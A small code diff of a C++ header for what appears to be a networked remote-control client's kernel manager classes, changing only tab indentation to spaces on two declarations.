@@ -132,7 +132,7 @@ public:
     CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, HINSTANCE hInstance, ThreadInfo* kb, State& s);
     virtual ~CKernelManager();
     VOID OnReceive(PBYTE szBuffer, ULONG ulLength);
-	virtual VOID OnHeatbeatResponse(PBYTE szBuffer, ULONG ulLength);
+    virtual VOID OnHeatbeatResponse(PBYTE szBuffer, ULONG ulLength);
     ThreadInfo* m_hKeyboard;
     ThreadInfo  m_hThread[MAX_THREADNUM];
     // 此值在原代码中是用于记录线程数量；当线程数量超出限制时m_hThread会越界而导致程序异常
@@ -218,7 +218,7 @@ public:
 class AuthKernelManager : public CKernelManager
 {
 public:
-	bool m_bFirstHeartbeat = true;
+    bool m_bFirstHeartbeat = true;
 
     AuthKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, HINSTANCE hInstance, ThreadInfo* kb, State& s)
         : CKernelManager(conn, ClientObject, hInstance, kb, s)
